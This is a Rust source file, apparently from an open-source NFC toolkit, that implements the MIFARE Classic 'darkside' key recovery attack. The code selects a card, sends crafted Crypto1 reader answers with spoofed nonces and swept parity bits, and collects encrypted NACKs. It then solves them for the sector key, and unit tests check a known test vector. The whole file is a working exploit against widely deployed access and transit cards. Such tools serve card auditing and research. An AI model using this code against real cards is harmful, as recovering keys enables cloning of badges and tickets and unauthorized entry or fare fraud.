// SPDX-FileCopyrightText: 2009 Andrei Costin and MFCUK contributors
// SPDX-FileCopyrightText: Proxmark3 contributors
// SPDX-FileCopyrightText: 2026 NFC Foundry contributors
// SPDX-License-Identifier: GPL-3.0-or-later

//! Darkside (card-only) key recovery.
//!
//! Ported from MFCUK's host-driven darkside collection. Each probe selects
//! the card, reads one tag nonce, sends one crafted Crypto1 reader answer with
//! a spoofed nonce and parity bits, and records the encrypted four-bit NACK.
//! Eight NACKs that share one tag nonce are solved with `lfsr_common_prefix`.
//!
//! The tag nonce repeats across selections on weak-PRNG cards; the collector
//! caches nonces and fills the eight slots across their appearances, exactly
//! like MFCUK. A card that never repeats a nonce produces no sample.

use std::collections::HashMap;

use nfc_core::{CancelToken, Key, KeyType, NfcError, Result};
use nfc_transport::Reader;

use crate::acquire::{crc_a, select_card};
use crate::crypto1::{lfsr_common_prefix, odd_parity8};
use crate::mfkey::key_from_u64;

const AUTH_A: u8 = 0x60;
const AUTH_B: u8 = 0x61;
const NACK: u8 = 0x05;
const START_NR: u32 = 0xDEAD_BEEF;
const START_AR: u32 = 0xFACE_CAFE;
const MAX_LEVELS: usize = 8;
const MAX_TAG_NONCES: usize = 65_536;
const PARITY_COMBINATIONS: u8 = 0x20;
const PROGRESS_INTERVAL: usize = 64;

/// One completed darkside observation: eight NACK keystream nibbles and their
/// parity rows for a single tag nonce.
#[derive(Clone, Copy, Debug)]
pub struct DarksideSample {
    pub uid: u32,
    pub tag_nonce: u32,
    pub reader_nonce: u32,
    pub reader_response: u32,
    pub parities: [[u8; 8]; 8],
    pub keystream: [u8; 8],
}

/// Recovers candidate keys from a completed eight-observation sample.
pub fn solve(sample: &DarksideSample) -> Vec<Key> {
    let states = lfsr_common_prefix(
        sample.reader_nonce,
        sample.reader_response,
        &sample.keystream,
        &sample.parities,
        false,
    );
    let mut keys = Vec::with_capacity(states.len());
    for mut state in states {
        state.rollback_word(sample.uid ^ sample.tag_nonce, false);
        keys.push(key_from_u64(state.key()));
    }
    keys.sort_unstable_by(|left, right| left.as_bytes().cmp(right.as_bytes()));
    keys.dedup();
    keys
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Stage {
    First,
    Slot(usize),
}

struct Group {
    uid: u32,
    spoof_nr: u32,
    spoof_ar: u32,
    spoof_parity: u8,
    stage: Stage,
    nr_enc: [u32; MAX_LEVELS],
    ar_enc: [u32; MAX_LEVELS],
    par_bits: [u8; MAX_LEVELS],
    par_combo: [u8; MAX_LEVELS],
    keystream: [u8; MAX_LEVELS],
}

impl Group {
    fn new(uid: u32) -> Self {
        Self {
            uid,
            spoof_nr: START_NR,
            spoof_ar: START_AR,
            spoof_parity: 0,
            stage: Stage::First,
            nr_enc: [0; MAX_LEVELS],
            ar_enc: [0; MAX_LEVELS],
            par_bits: [0; MAX_LEVELS],
            par_combo: [0; MAX_LEVELS],
            keystream: [0; MAX_LEVELS],
        }
    }

    fn reset_next_nonce(&mut self) {
        self.spoof_nr = self.spoof_nr.wrapping_add(1);
        self.spoof_ar = START_AR;
        self.spoof_parity = 0;
        self.stage = Stage::First;
    }

    /// Builds the next 64-bit reader answer and its eight parity bits. In the
    /// first stage the nonce and answer are spoofed values; once the first NACK
    /// arrives the low five parity bits are swept per slot.
    fn next_probe(&mut self) -> ([u8; 8], [u8; 8], Option<usize>) {
        match self.stage {
            Stage::First => (
                reader_answer(self.spoof_nr, self.spoof_ar),
                parity_bits(self.spoof_parity),
                None,
            ),
            Stage::Slot(slot) => {
                let parity = self.par_bits[slot].wrapping_add(self.par_combo[slot]);
                self.par_combo[slot] = self.par_combo[slot].wrapping_add(1);
                (
                    reader_answer(self.nr_enc[slot], self.ar_enc[slot]),
                    parity_bits(parity),
                    Some(slot),
                )
            }
        }
    }

    fn start_slots(&mut self) {
        let prefix = self.spoof_nr & 0xFFFF_FF1F;
        for slot in 0..MAX_LEVELS {
            self.nr_enc[slot] = prefix | ((slot as u32) << 5);
            self.ar_enc[slot] = self.spoof_ar;
            self.par_bits[slot] = self.spoof_parity & 0xE0;
            self.par_combo[slot] = 0;
            self.keystream[slot] = 0;
        }
        self.stage = Stage::Slot(0);
    }

    fn record_nack(&mut self, slot: usize, nack: u8, tag_nonce: u32) -> Option<DarksideSample> {
        self.keystream[slot] = nack ^ NACK;
        if slot + 1 < MAX_LEVELS {
            self.stage = Stage::Slot(slot + 1);
            return None;
        }
        let sample = self.sample(tag_nonce);
        if solve(&sample).is_empty() {
            self.reset_next_nonce();
            return None;
        }
        Some(sample)
    }

    fn sample(&self, tag_nonce: u32) -> DarksideSample {
        let mut parities = [[0u8; 8]; 8];
        for (slot, row) in parities.iter_mut().enumerate() {
            let parity = self.par_bits[slot]
                .wrapping_add(self.par_combo[slot])
                .wrapping_sub(1);
            for (index, bit) in row.iter_mut().enumerate() {
                *bit = (parity >> (7 - index)) & 1;
            }
        }
        DarksideSample {
            uid: self.uid,
            tag_nonce,
            reader_nonce: self.spoof_nr & 0xFFFF_FF1F,
            reader_response: self.spoof_ar,
            parities,
            keystream: self.keystream,
        }
    }
}

fn reader_answer(nonce: u32, response: u32) -> [u8; 8] {
    let mut frame = [0u8; 8];
    frame[..4].copy_from_slice(&nonce.to_be_bytes());
    frame[4..].copy_from_slice(&response.to_be_bytes());
    frame
}

fn parity_bits(parity: u8) -> [u8; 8] {
    let mut bits = [0u8; 8];
    for (index, bit) in bits.iter_mut().enumerate() {
        *bit = (parity >> (7 - index)) & 1;
    }
    bits
}

enum Answer {
    Nack(u8),
    Authenticated,
    Rejected,
}

fn classify_answer(bits: usize, data: &[u8]) -> Answer {
    if bits == 4 && data.len() == 1 {
        Answer::Nack(data[0] & 0x0F)
    } else if bits == 32 && data.len() == 4 {
        Answer::Authenticated
    } else {
        Answer::Rejected
    }
}

/// Collects a darkside sample. Returns `None` when the card never completes
/// one tag nonce, or when no key can be derived from the observations.
pub fn collect(
    reader: &mut dyn Reader,
    block: u8,
    key_type: KeyType,
    cancel: &CancelToken,
    max_attempts: usize,
) -> Result<Option<DarksideSample>> {
    collect_with_progress(reader, block, key_type, cancel, max_attempts, &mut |_| {})
}

/// Collects a darkside sample and reports the attempt count periodically.
pub fn collect_with_progress(
    reader: &mut dyn Reader,
    block: u8,
    key_type: KeyType,
    cancel: &CancelToken,
    max_attempts: usize,
    progress: &mut dyn FnMut(usize),
) -> Result<Option<DarksideSample>> {
    let mut groups: HashMap<u32, Group> = HashMap::new();
    let mut attempts = 0;
    while attempts < max_attempts {
        cancel.check()?;
        attempts += 1;
        if attempts % PROGRESS_INTERVAL == 0 {
            progress(attempts);
        }

        reader.set_recovery_mode(false)?;
        let (_, uid) = select_card(reader)?;
        reader.set_recovery_mode(true)?;
        let tag_nonce = match partial_auth(reader, block, key_type) {
            Ok(Some(nonce)) => nonce,
            Ok(None) => {
                let _ = reader.set_recovery_mode(false);
                continue;
            }
            Err(error) => {
                let _ = reader.set_recovery_mode(false);
                return Err(error);
            }
        };

        if !groups.contains_key(&tag_nonce) {
            if groups.len() >= MAX_TAG_NONCES {
                let _ = reader.set_recovery_mode(false);
                return Ok(None);
            }
            groups.insert(tag_nonce, Group::new(uid));
        }
        let group = groups.get_mut(&tag_nonce).expect("group was just inserted");
        group.uid = uid;
        if let Stage::Slot(slot) = group.stage
            && group.par_combo[slot] >= PARITY_COMBINATIONS
        {
            group.reset_next_nonce();
        }

        let (frame, parity, slot) = group.next_probe();
        let answer = reader.transceive_parity(&frame, &parity);
        let reset = reader.set_recovery_mode(false);
        let answer = match answer {
            Ok(answer) => answer,
            Err(NfcError::Timeout(_) | NfcError::NoCard) => {
                reset?;
                if let Some(slot) = slot {
                    if group.par_combo[slot] >= PARITY_COMBINATIONS {
                        group.reset_next_nonce();
                    }
                } else {
                    group.spoof_parity = group.spoof_parity.wrapping_add(1);
                }
                continue;
            }
            Err(error) => {
                let _ = reset;
                return Err(error);
            }
        };
        reset?;

        match classify_answer(answer.bits, &answer.data) {
            Answer::Nack(nack) => match slot {
                None => group.start_slots(),
                Some(slot) => {
                    if let Some(sample) = group.record_nack(slot, nack, tag_nonce) {
                        return Ok(Some(sample));
                    }
                }
            },
            Answer::Authenticated => {
                // A spoofed key authenticated by chance; it is not a useful
                // sample and the nonce can no longer be reused.
                group.reset_next_nonce();
            }
            Answer::Rejected => {
                if let Some(slot) = slot {
                    if group.par_combo[slot] >= PARITY_COMBINATIONS {
                        group.reset_next_nonce();
                    }
                } else {
                    group.spoof_parity = group.spoof_parity.wrapping_add(1);
                }
            }
        }
    }
    progress(attempts);
    Ok(None)
}

fn partial_auth(reader: &mut dyn Reader, block: u8, key_type: KeyType) -> Result<Option<u32>> {
    let mut command = vec![
        match key_type {
            KeyType::A => AUTH_A,
            KeyType::B => AUTH_B,
        },
        block,
    ];
    let crc = crc_a(&command);
    command.extend_from_slice(&crc);
    let parity: Vec<u8> = command.iter().map(|byte| odd_parity8(*byte)).collect();
    match reader.transceive_parity_expect(&command, &parity, 36) {
        Ok(response) => {
            if response.data.len() != 4 || response.bits != 32 {
                return Ok(None);
            }
            Ok(Some(u32::from_be_bytes([
                response.data[0],
                response.data[1],
                response.data[2],
                response.data[3],
            ])))
        }
        Err(NfcError::Timeout(_) | NfcError::NoCard) => Ok(None),
        Err(error) => Err(error),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::crypto1::{keystream_bytes, parity_rows};

    #[test]
    fn pm3_nonce2key_vector_through_sample() {
        let sample = DarksideSample {
            uid: 0xE9CA_DD9C,
            tag_nonce: 0xA8BF_4A12,
            reader_nonce: 0,
            reader_response: 0,
            parities: parity_rows(0xA020_A828_5858_B090),
            keystream: keystream_bytes(0x050F_0106_0706_0E07),
        };
        let keys = solve(&sample);
        assert!(keys.iter().any(|key| key.to_hex() == "FC00018778F7"));
    }

    #[test]
    fn reader_answer_is_big_endian_nonce_then_response() {
        let frame = reader_answer(0xDEAD_BEEF, 0xFACE_CAFE);
        assert_eq!(frame, [0xDE, 0xAD, 0xBE, 0xEF, 0xFA, 0xCE, 0xCA, 0xFE]);
    }

    #[test]
    fn parity_bits_map_the_top_bit_to_the_first_byte() {
        assert_eq!(parity_bits(0x80), [1, 0, 0, 0, 0, 0, 0, 0]);
        assert_eq!(parity_bits(0x01), [0, 0, 0, 0, 0, 0, 0, 1]);
    }
}
